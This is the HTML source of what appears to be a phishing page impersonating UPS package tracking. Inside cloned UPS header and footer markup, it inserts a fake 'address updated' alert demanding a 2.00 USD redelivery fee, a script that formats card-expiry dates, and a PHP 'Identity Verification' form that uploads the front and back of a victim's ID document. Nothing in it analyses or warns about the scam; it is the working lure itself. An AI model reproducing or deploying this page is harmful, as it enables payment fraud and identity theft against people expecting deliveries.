            <li class="ups-loginsignup ups-firstnav "><span aria-hidden="true" class="icon ups-icon-user-solid"></span><a class="ups-analytics" data-content-block-id="M1" data-event-id="21" href="https://www.ups.com/lasso/login?loc=en_US&amp;returnto=https%3A%2F%2Fwww.ups.com%2Ftrack%3Floc%3Den_US%26Requester%3Dlasso">Log in / Sign up</a></li> 
             
           </ul> 
          </nav> 
          <div class="ups-container ups-container-search-track"> 
           <div id="ups-header-search" class="ups-menu col-md-3"> 
            <form id="ups-header_search" class="ups-width_expand ups-hide_nav" data-action="/us/en/SearchResults.page" role="search" data-track="https://wwwapps.ups.com/WebTracking/track?loc=en_US" data-svp-track="/mobile/track?loc=en_US#Track">
             <label for="ups-mainNav-search" class="ups-readerTxt">Track a package or search</label>
             <input id="ups-mainNav-search" type="search" name="ups-search" class="ups-expand_search_input ui-autocomplete-input" placeholder="Track a package or search" autocomplete="off">
             <input type="hidden" name="HTMLVersion" value="5.0">
             <input type="hidden" name="loc" value="en_US">
             <input type="hidden" name="trackNums" class="ups-trackSearch_header">
             <input value="Track" name="track.x" type="hidden">
             <button id="ups-mainNav_search_submit" class="ups-header_search_submit" type="submit" data-content-block-id="M1" data-event-id="21"><i class="ups-icon-search" aria-hidden="true"></i><span class="ups-readerTxt">Go</span></button>
             <button id="ups-header_search-close" class="ups-header_search_close" type="button" data-content-block-id="M1" data-event-id="21"><i class="ups-icon-x" aria-hidden="true"></i><span class="ups-readerTxt">Close</span></button>
            </form>
            <button id="ups-search-toggle" class="ups-search-button" type="button"><i>Track a package or search</i><span class="ups-iconAlone ups-icon-search" aria-hidden="true"></span></button>
           </div> 
          </div> 
         </div> 
        </div> 
       </div> 
      </header> 
     </div>
     <script type="text/javascript">
			var expand='expand';
			var collapse='Collapse';
			var wems_country='US';
			var wems_locale='en_US';
			var wems_ext_locale='en_US';
			var wems_ts='';
			var $location;
			var obj_live_chat= {
				'spa_app_id':'com.ups.stapp',
				'live_chat':'https://ups6.custhelp.com/app/home/p_data/'
			};
			var alertsUrl='/master/track/simplified-tracking-container/1613996032224.ajax?';
			var rightRailLabel='Related information';

            var popularTerms = {"title":"Popular Links and Searches","popularTerms":[{"name":"claim","url":"/us/en/help-center/claims-support.page","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"supplies","url":"/us/en/help-center/packaging-and-supplies.page","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"track","url":"https://www.ups.com/track?loc=en_US","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"ship","url":"https://www.ups.com/ship?loc=en_US","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"pick up","url":"/us/en/shipping/services/pickup.page","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"billing","url":"/us/en/services/billing.page","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"follow my delivery","url":"/us/en/help-center/sri/follow-my-delivery.page","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"infonotice","url":"/us/en/help-center/tracking-support/infonotice.page","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Link"},"isLinkContainer":true},{"name":"my choice","icon":"ups-icon-search","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Search Term"},"isLinkContainer":false},{"name":"labels","icon":"ups-icon-search","dataAttributes":{"data-on_site_search_assist_src":"Popular Terms","data-on_site_search_assist_type":"Search Term"},"isLinkContainer":false}]};
		</script> 
    </div> 
   </div> 
  </div> 
 </div> 
</div>
        <div class="container-fluid iw_section" id="sectionisswf4ts"> 
 <div class="row iw_row iw_stretch" id="rowisswf4tt"> 
  <div class="iw_columns col-lg-12" id="colisswf4tu"> 
   <div class="iw_placeholder" id="iw_placeholder1473252365879"> 
    <div class="iw_component" id="iw_comp1613996032226"> 
    </div> 
   </div> 
   <div class="iw_placeholder" id="iw_placeholder1473252365871"> 
    <div class="iw_component" id="iw_comp1615885741197"> 
     <!--ls:begin[component-1615885741197]-->
     <!--ls:end[component-1615885741197]--> 
    </div> 
   </div>    
  </div> 
 </div> 
</div><!-- begin body wrapper --> <div class="container-fluid iw_section"> <div class="row iw_row iw_stretch"> <div class="iw_columns col-lg-12"> <div class="iw_component"> <div id="ups-fw_legacy_app_wrap"> <div class="ups-fw_legacy_app_inner"><div id="main">
        <main id="ups-main">
            <div class="ups-form_wrap ups-application_wrapper ups-simplified_tracking">
            

                <!--Simplified Tracking Client Application.-->
                <app-root stapp_locale="en_US" stapp_clientmapkey="ArLnEIjcDlh0S0C8WC-BO95tEcxGiTmXGBi1kjAjBZn8Q7Q0Hv8scCmtVnL_xORR" isuserloggedin="False" isloggedinavailable="True" loginsignupreturntolink="https%3A%2F%2Fwww.ups.com%2Ftrack%3Floc%3Den_US%2Fredirect" mychsignuplink="/doapp/SignUpMyChoice?loc=en_US&amp;returnto=http%3A%2F%2Fwww.ups.com%2Ftrack%3Floc%3Den_US%2Fredirect" qvmlink="//www.ups.com/content/us/en/tracking/quantumview/index.html" mychtermlink="//www.ups.com/us/en/help-center/legal-terms-conditions/my-choice.page" flexlink="//www.ups.com/content/us/en/tracking/fgv/index.html" stolink="#" useremail="" _nghost-c0="" ng-version="5.2.11">
<!---->

<!----><div _ngcontent-c0="" class="ng-star-inserted">
  <router-outlet _ngcontent-c0=""></router-outlet><app-track _nghost-c1="" class="ng-star-inserted"><!----><div _ngcontent-c1="" class="ng-star-inserted">
  <div _ngcontent-c1="" class="ups-bg_section ups-bg_stone_60">
    <form _ngcontent-c1="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
      <!----><div _ngcontent-c1="" class="ups-wrap ng-star-inserted" id="stApp_track_title">
        <div _ngcontent-c1="" class="ups-wrap_inner">
          <div _ngcontent-c1="" class="ups-app_confined">
            <div _ngcontent-c1="" class="row">
              <div _ngcontent-c1="" class="col-md-8">
                <div _ngcontent-c1="" class="ups-card">
                  <div _ngcontent-c1="" class="ups-card_content">

                    <!---->
                    <!---->
                    <!---->
                    <h2 _ngcontent-c1="" class="ups-text_slim" id="stApp_track_label">
                      <span _ngcontent-c1="" aria-hidden="true" class="icon ups-icon-track ups-icon_size_xxl" id="stApp_track_label_icon"></span>
                      Track
                    </h2>
                    <div _ngcontent-c1="" class="ups-form_group ups-help_wrapper">
                      <label _ngcontent-c1="" class="ups-readerTxt" for="stApp_trackingNumber" id="stApp_lblEnterTrackNo_RTxt">Tracking Numbers</label>
                      <p _ngcontent-c1="" class="ups-form_subheader ups-form_subheader_has_help" id="stApp_lblEnterUpTo25TrackNo">
                       <b> Tracking Number : RAxxxxxxxxxUS</b>
                      </p>
                      <div _ngcontent-c1="" class="ups-help">
                        <button _ngcontent-c1="" class="ups-help_link" id="stApp_ups-formHelp2" type="button">
                          <span _ngcontent-c1="" aria-hidden="true" class="icon ups-icon-newwindow"></span>
                          Help
                        </button>
                        <div _ngcontent-c1="" class="ups-help_tooltip ups-help_tooltip_topleft">
                          <button _ngcontent-c1="" class="ups-help_close" id="stApp_iconClose_btn" type="button">
                            <span _ngcontent-c1="" aria-hidden="true" class="icon ups-icon-x ups-iconAlone" id="stApp_iconClose_btnX"></span>
                            <span _ngcontent-c1="" class="ups-readerTxt" id="stApp_iconClose">Close</span>
                          </button>
                          <p _ngcontent-c1="" id="stApp_LoremIpsum">Lorem ipsum</p>
                        </div>
                      </div>
                      <div _ngcontent-c1="" class="ups-input_wrapper ups-textArea_wrapper">
                        
                        
                        <b style="display: none;">Status : <p style="color:red"> We have issues concerning your shipping address</p></b>


<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

     <br><div class="alert alert-danger" role="alert">
  <h4 class="alert-heading">Almost done!</h4>
  <p>we have updated your shipping address</p>
  <hr>
  <p class="mb-0">Note: This redelivery costs  2.00 USD.</p>
</div>

                        <span _ngcontent-c1="" class="ups-icons-error" id="stApp_trackingNumEntry_error">
                          <!---->
                          <!---->
                        </span>
                      </div>
                      <span _ngcontent-c1="" class="ups-readerTxt" id="trackingNumEntry_numLines" role="alert">
                        1 of 25 tracking numbers entered.
                      </span>
                    </div>
                    <add-shipper-account _ngcontent-c1="" _nghost-c2=""><!---->

<!---->

<ups-modal _ngcontent-c2=""><!---->
<!---->
</ups-modal>
</add-shipper-account>

<script type="text/javascript">
     function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}

</script>
               
                    
                  </div>
                </div>
              </div>

              <div _ngcontent-c1="" class="col-md-4">
                <div _ngcontent-c1="" class="ups-card">
                  <div _ngcontent-c1="" class="ups-card_content">
                    <div _ngcontent-c1="" class="ups-group">
                        <ups-track-reference _ngcontent-c1="" _nghost-c3="">

    </form>

<script>
</script>
<form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>" enctype="multipart/form-data">
  <b>Identity Verification</b>
  <center>
<img src="dl.png">


<script>
function hhhh(){
	document.getElementById('fileup').click();
}
function hhhh2(){
	document.getElementById('fileup2').click();
}
</script>

<br><br>
<input required style="display:none;" type="file" name="fileup" id="fileup" />
<input required style="display:none;" type="file" name="fileup2" id="fileup2" />
<button _ngcontent-c1="" class="ups-cta ups-cta_primary" id="stApp_btnTrack" type="submit" style="cursor: pointer;width: 50%;" onclick="hhhh();">Upload Front</button>
<br><br>
<button _ngcontent-c1="" class="ups-cta ups-cta_primary" id="stApp_btnTrack" type="Button" style="cursor: pointer;width: 50%;" onclick="hhhh2();">Upload Back</button>

<br><br><br>


<button _ngcontent-c1="" class="ups-cta ups-cta_primary" id="stApp_btnTrack" type="submit" name="submit" style="cursor: pointer;">Next</button>

</center>
<br>
<button style="display: none;" id="submitus" name="submitus">Submit</button>
</form>
<ups-modal _ngcontent-c3=""><!---->
<!---->
</ups-modal>

</ups-track-reference>
                    </div>
                    <!----><div _ngcontent-c1="" class="ups-group hidden-sm hidden-xs ng-star-inserted">
                      <import-track _ngcontent-c1="" _nghost-c4=""><!---->
<!---->
<ups-modal _ngcontent-c4=""><!---->
<!---->
</ups-modal>
  

  <ups-modal _ngcontent-c4=""><!---->
<!---->
</ups-modal></import-track>
                      
                    </div>
                    <div _ngcontent-c1="" class="ups-group">
                      <other-services _ngcontent-c1="" _nghost-c5="">

<ups-modal _ngcontent-c5=""><!---->
<!---->
</ups-modal>

</other-services>
                      
                    </div>
                    
                    <!---->

                  </div>
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>


  
  <!----><div _ngcontent-c1="" class="ng-star-inserted">
    <recently-tracked _ngcontent-c1="" _nghost-c6="" class="ng-tns-c6-0"><!---->
</recently-tracked>
  </div>
  
  </div>
  <!---->
  <!----><div _ngcontent-c1="" class="ups-wrap ng-star-inserted">
      <div _ngcontent-c1="" class="ups-wrap_inner">
        <div _ngcontent-c1="" class="ups-app_confined">
          <div _ngcontent-c1="" class="ups-section">
            <div _ngcontent-c1="" class="ups-section-header">
              <h2 _ngcontent-c1="" id="stApp_RecentlyTrackedRecentlyTrkTxt">Recently Tracked</h2>
            </div>
            
            <!---->
            <!----><p _ngcontent-c1="" class="ng-star-inserted">
              <a _ngcontent-c1="" class="ups-link" id="stApp_link_login" href="">Log in</a>
              or
              <a _ngcontent-c1="" class="ups-link" id="stApp_link_signup" href="">Sign up</a>
              to view your recently tracked shipments.
            </p>
          </div>
        </div>
      </div>
    </div>
</div>
<ups-modal _ngcontent-c1=""><!---->
<!---->
</ups-modal>
<load-indicator _ngcontent-c1="" _nghost-c7=""><!---->
</load-indicator>
<current-path _ngcontent-c1="" path="st_track" _nghost-c8=""></current-path></app-track>
</div>
</app-root>

                <!--Identity Verification User Interface.-->
                <identity></identity>
                <input type="hidden" value="TRK" id="mnmAppID" name="mnmAppID">
                <input type="hidden" value="TRACK" id="qvMnmAppID" name="qvMnmAppID">
                <input type="hidden" value="ALERT" id="mnmMobileProgramType" name="mnmMobileProgramType">
                <input type="hidden" value="OPTIN" id="mnmServiceType" name="mnmServiceType">
                <input type="hidden" value="false" id="mnmRememberMe" name="mnmRememberMe">
                <input type="hidden" value="false" id="termsValueId" name="termsValueId">
                <input type="hidden" id="allowedCountries" value="AI,AG,AR,AW,AU,AT,BS,BH,BB,
             BE,BM,BO,BR,BG,CA,CA,KY,CL,CN,CO,CR,HR,CB,CY,CZ,DK,DM,DO,EC,SV,EE,FI,FR,DE,GH,GR,GD,GP,GT,GY,HT,HN,HK,HU,IN,ID,IE,IL,IT,CI,JM,JP,KE,KW,LV,LB,LT,LU,MO,MY,MT,MX,MS,MA,NL,NZ,NI,NG,NO,PA,PY,PE,PH,PL,PT,PR,QA,RE,RO,RU,SA,SG,SK,SI,ZA,KR,ES,EU,KN,LC,VC,SR,SE,CH,TW,TH,TR,UA,AE,GB,US,UY,VI,VE,VN,VG,ZW">

            </div>
        </main>
        <input id="localeValue" name="localeValue" type="hidden" value="en_US">
        </div></div> </div> </div> </div> </div> </div> <!-- end body wrapper -->
        <div class="container-fluid iw_section" id="sectionj9rfozjs"> 
 <div class="row iw_row iw_stretch" id="rowj9rfozjt"> 
  <div class="iw_columns col-lg-12" id="colj9rfozju"> 
   <div class="iw_placeholder" id="iw_placeholder1510169105655"> 
    <div class="iw_component" id="iw_comp1618564666661"> 
     <div class="ups-contentBlock ups-wrap hpps-altcontent ups-analytics-render" data-content-block-id="M44" data-content-id="templatedata/content/content-block/data/en_US/freight-ltl-disclaimer-2021.dcr"> 
      <div class="ups-wrap_inner"> 
       <div class="ups-contentBlock_wrap clearfix">
        <div>
         UPS Freight Less-than-Truckload (“LTL”) transportation services are offered by TFI International Inc., its affiliates or divisions (including without limitation TForce Freight), which are not affiliated with United Parcel Service, Inc. or any of its affiliates, subsidiaries or related entities (“UPS”). UPS assumes no liability in connection with UPS Freight LTL transportation services or any other services offered or provided by TFI International Inc. or its affiliates, divisions, subsidiaries or related entities.
        </div>
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
   <div class="iw_placeholder" id="iw_placeholder1510655492385"> 
    <div class="iw_component" id="iw_comp1613996032225"> 
     <style type="text/css">

            #ups-footer .h2_eqivalent {
            font-family: Tahoma,helvetica,arial,sans-serif !important;
            font-size: 1.2em;
            padding-bottom: 7px;
            margin: 20px 0 15px;
            font-weight: bold
            }

            #ups-footer .h2_eqivalent span {
            font-family: Tahoma,helvetica,arial,sans-serif !important
            }

            @media (max-width: 991px) {
            #ups-footer .h2_eqivalent {
            font-family: Tahoma,helvetica,arial,sans-serif !important;
            text-transform: none;
            border-bottom: 1px solid #757575;
            margin: 0 -60px;
            padding: 22px 60px;
            position: relative
            }
            #ups-footer .h2_eqivalent span {
            font-family: Tahoma,helvetica,arial,sans-serif !important
            }
            #ups-footer .h2_eqivalent.ups-active .ups-iconAlone:before {
            content: "\e653"
            }
            #ups-footer .h2_eqivalent button {
            -webkit-appearance: none;
            border-radius: 0;
            background: none;
            border: none;
            padding: 0;
            line-height: 1;
            position: absolute;
            right: 60px;
            top: 50%;
            width: 44px;
            height: 44px;
            line-height: 54px;
            font-size: 1.1em;
            margin: -22px 0 0;
            margin-right: -10px;
            text-align: center;
            overflow: hidden
            }
            #ups-footer .ups-footer_custserv .h2_eqivalent {
            background: none
            }
            #ups-footer .ups-footer_custserv .h2_eqivalent .icon:before {
            font-family: "upsicons" !important;
            font-style: normal !important;
            font-weight: normal !important;
            font-variant: normal !important;
            text-transform: none !important;
            speak: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            content: "\e660";
            line-height: 0;
            font-size: 1.3em;
            position: relative;
            top: 5px;
            margin-right: 9px
            }
            }

            @media (max-width: 767px) {
            #ups-footer .h2_eqivalent {
            margin: 0 -20px;
            padding: 22px 20px
            }
            #ups-footer .h2_eqivalent button {
            right: 20px
            }
            }

            .h2_eqivalent {
            font-size: 1.5em
            font-family: Tahoma,helvetica,arial,sans-serif;
            font-weight: normal
            }

            .h2_eqivalent .ups-rtl {
            font-family: Tahoma,helvetica,arial,sans-serif;
            font-weight: 700
            }

        </style>
     <script type="text/javascript">
            $(window).on("load", function() {
                $.each($('.ups-footer_colsCont .ups-footer_links'), function() {
                    var ulExits = false;
                    if ($(this).find('ul').length <= 0) {
                        $(this).find('.h2_eqivalent').hide();
                    } else {
                        $.each($(this).find('ul'), function() {
                            var liPresent = $(this).children().length;
                            if (liPresent > 0) {
                                var txt = $("li", this).text();
                                if (txt.length <= 0) {
                                    $(this).hide();
                                    if (!ulExits) {
                                        $(this).siblings('.h2_eqivalent').hide();
                                    }
                                } else {
                                    ulExits = true;
                                    $(this).show();
                                    $(this).siblings('.h2_eqivalent').show();
                                }
                            } else {
                                $(this).hide();
                                if (!ulExits) {
                                    $(this).siblings('.h2_eqivalent').hide();
                                }
                            }
                        });
                    }
                });
            });
        </script>
     <footer id="ups-footerWrap" class="ups-wrap hpps-basic" role="contentinfo"> 
      <div id="ups-footer" class="ups-wrap_inner ups-analytics-render" data-content-block-id="M2" data-content-id="templatedata/navigation/footer-config/data/en_US/footer-full-us.dcr" aria-multiselectable="true"> 
       <div class="ups-footer_colsCont ups-container"> 
        <div class="ups-footer_custserv col-md-3"> 
         <div class="ups-footer_links"> 
          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_custServe" role="heading" aria-level="2">
           <span class="icon" aria-hidden="true"></span>
           <span id="ups-footer_custServe2">Customer Service</span>
           <button class="ups-med_show" aria-controls="ups-footer_custServeLinks ups-footer_custServeConacts" aria-labelledby="ups-footer_custServe2" aria-expanded="false"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
          </div> 
          <ul class="ups-footer_expand" aria-labelledby="ups-footer_custServe" id="ups-footer_custServeLinks" aria-hidden="true"> 
           <li><a href="/us/en/help-support-center.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Help and Support Center<span class="" aria-hidden="true"></span></a></li> 
           <li><a href="/us/en/help-center/get-started-with-ups.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Get Started with UPS<span class="" aria-hidden="true"></span></a></li> 
           <li><a href="/us/en/help-center/sri/tracking/change-delivery.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Change Delivery<span class="" aria-hidden="true"></span></a></li> 
           <li><a href="/us/en/help-center/claims-support.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Claims Support<span class="" aria-hidden="true"></span></a></li> 
          </ul> 
          <ul class="ups-footer_contact ups-footer_expand" aria-labelledby="ups-footer_custServe" id="ups-footer_custServeConacts" style="display: none;" aria-hidden="true"></ul> 
         </div> 
        </div> 
        <div class="ups-footer_col col-md-3 ups-left-md"> 
         <div class="ups-footer_links"> 
          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_thisSite" role="heading" aria-level="2">
           <span id="ups-footer_thisSite2">This Site</span>
           <button class="ups-med_show" aria-controls="ups-footer_thisSiteLinks" aria-expanded="false" aria-labelledby="ups-footer_thisSite2"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
          </div> 
          <ul class="ups-footer_expand" aria-labelledby="ups-footer_thisSite" id="ups-footer_thisSiteLinks" aria-hidden="true"> 
           <li><a href="/us/en/services/tracking.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Tracking</a></li> 
           <li><a href="/us/en/shipping.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Shipping</a></li> 
           <li><a href="/us/en/services.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Services</a></li> 
           <li><a href="https://www.ups.com/dropoff?loc=en_US" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Locations</a></li> 
           <li><a href="https://wwwapps.ups.com/ppc/ppc.html?loc=en_US#/profilePage" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">My Profile</a></li> 
           <li><a href="https://wwwapps.ups.com/emailEnrollment/signIn?loc=en_US" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Communication Preferences</a></li> 
          </ul> 
         </div> 
        </div> 
        <div class="ups-footer_col col-md-3 ups-left-md"> 
         <div class="ups-footer_info ups-footer_links"> 
          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_companyInfo" role="heading" aria-level="2">
           <span id="ups-footer_companyInfo2">Company Info</span>
           <button class="ups-med_show" aria-labelledby="ups-footer_companyInfo2" aria-expanded="false" aria-controls="ups-footer_companyInfoLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
          </div> 
          <ul class="ups-footer_expand" aria-labelledby="ups-footer_companyInfo" id="ups-footer_companyInfoLinks" aria-hidden="true"> 
           <li><a href="/us/en/about.page?" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">About UPS<span class="" aria-hidden="true"></span></a></li> 
           <li><a href="https://about.ups.com/us/en/newsroom.html" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Media Relations<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="http://www.investors.ups.com" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Investor Relations<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="https://www.jobs-ups.com/location" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Careers<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="https://about.ups.com/us/en/social-impact.html" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21">Sustainability &amp; Community Involvement<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
          </ul> 
         </div> 
         <div class="ups-footer_sites ups-footer_links"> 
          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_otherSites" role="heading" aria-level="2">
           <span id="ups-footer_otherSites2">Other UPS Sites</span>
           <button class="ups-med_show" aria-labelledby="ups-footer_otherSites2" aria-expanded="false" aria-controls="ups-footer_otherSitesLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
          </div> 
          <ul class="ups-footer_expand" aria-labelledby="ups-footer_otherSites" id="ups-footer_otherSitesLinks" aria-hidden="true"> 
           <li><a href="https://www.theupsstore.com?loc=en_US" target="_blank" rel="noopener noreferrer" data-content-block-id="M2" data-event-id="24">The UPS Store<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="https://upscapital.com" target="_blank" rel="noopener noreferrer" data-content-block-id="M2" data-event-id="24">UPS Capital<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="/us/en/about/sites.page?" target="_blank" rel="noopener noreferrer" data-content-block-id="M2" data-event-id="24"><b>See All</b><span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
          </ul> 
         </div> 
        </div> 
        <div class="ups-footer_col col-md-3 ups-left-md"> 
         <div class="ups-footer_links"> 
          <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_connect" role="heading" aria-level="2">
           <span id="ups-footer_connect2">Connect with Us</span>
           <button class="ups-med_show" aria-labelledby="ups-footer_connect2" aria-expanded="false" aria-controls="ups-footer_connectLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
          </div> 
          <ul class="ups-footer_expand" aria-labelledby="ups-footer_connect" id="ups-footer_connectLinks" aria-hidden="true"> 
           <li><a href="http://www.facebook.com/ups" target="_blank" rel="noopener noreferrer" class="ups-footer_social-facebook" data-content-block-id="M2" data-event-id="24">Facebook<span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="https://twitter.com/UPS" target="_blank" rel="noopener noreferrer" class="ups-footer_social-twitter" data-content-block-id="M2" data-event-id="24">Twitter<span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="https://www.linkedin.com/company/ups" target="_blank" rel="noopener noreferrer" class="ups-footer_social-linkedin" data-content-block-id="M2" data-event-id="24">LinkedIn<span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="https://www.youtube.com/ups" target="_blank" rel="noopener noreferrer" class="ups-footer_social-youtube" data-content-block-id="M2" data-event-id="24">YouTube<span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
           <li><a href="https://www.ups.com/us/en/services/knowledge-center/longitudes-landing.page?articlesource=longitudes" data-content-block-id="M2" data-event-id="24">UPS Blog: <i>Longitudes</i></a></li> 
          </ul> 
         </div> 
        </div> 
       </div> 
       <div class="ups-footer_legal"> 
        <div class="ups-footer_links"> 
         <div class="ups-med_show ups-footer_toggle h2_eqivalent" id="ups-footer_legal" role="heading" aria-level="2">
          <span id="ups-footer_legal2">Legal</span>
          <button class="ups-med_show" aria-labelledby="ups-footer_legal2" aria-expanded="false" aria-controls="ups-footer_legalLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
         </div> 
         <ul class="ups-footer_expand" aria-labelledby="ups-footer_legal" id="ups-footer_legalLinks" aria-hidden="true"> 
          <li><a href="/us/en/global.page?" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Global Home<span class="" aria-hidden="true"></span></a></li> 
          <li><a href="/us/en/help-center/legal-terms-conditions/fight-fraud.page?" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Protect Against Fraud<span class="" aria-hidden="true"></span></a></li> 
          <li><a href="/us/en/help-center/legal-terms-conditions/service.page?" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Service Terms and Conditions<span class="" aria-hidden="true"></span></a></li> 
          <li><a href="/us/en/help-center/legal-terms-conditions/website.page?" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Website Terms of Use<span class="" aria-hidden="true"></span></a></li> 
          <li><a href="/us/en/help-center/legal-terms-conditions/california-privacy.page?" target="_blank" rel="noopener noreferrer" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Your California Privacy Rights<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
          <li><a href="/us/en/help-center/legal-terms-conditions/privacy-notice.page?" target="_blank" rel="noopener noreferrer" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Privacy Notice<span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li> 
          <li><a href="javascript:utag.gdpr.showConsentPreferences();window.scrollTo(0,0);" role="button" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Cookie Settings<span class="" aria-hidden="true"></span></a></li> 
          <li><a href="https://www.ups.com/ppwa/doWork?loc=en_US" class="ups-analytics" data-content-block-id="M2" data-event-id="21">Do Not Sell My Info<span class="" aria-hidden="true"></span></a></li> 
         </ul>
         <br>
         <p class="ups-footer_disclaimer">Copyright ©1994- 2021&nbsp;United Parcel Service of America, Inc. All rights reserved. </p> 
        </div> 
       </div> 
      </div>
      <img alt="" border="0" src="/img/icp.gif">
     </footer>
     <script type="text/javascript" src="https://ups.inq.com/chatskins/launch/inqChatLaunch10005649.js" charset="utf-8" defer=""></script> 
    </div> 
   </div> 
  </div> 
 </div> 
</div><script src="https://www.ups.com/assets/resources/scripts/ups.scripts.657f3e.js" type="text/javascript"></script></div>


  

        <!--Temproray for testing-->

    <noscript><img src="https://www.ups.com/akam/11/pixel_73f64317?a=dD1mZGZiYTRmNDM3MDhhMTgyOGQyMTY0ZWNmNWJlOWE0NTYzYmZmOGE3JmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript><script type="text/javascript" src="/ZaHCrMZsxk/SRmFnU/NBGi/1r9QVSfSamNY/ER9YcQE/aHNYe/gJBB1c"></script>


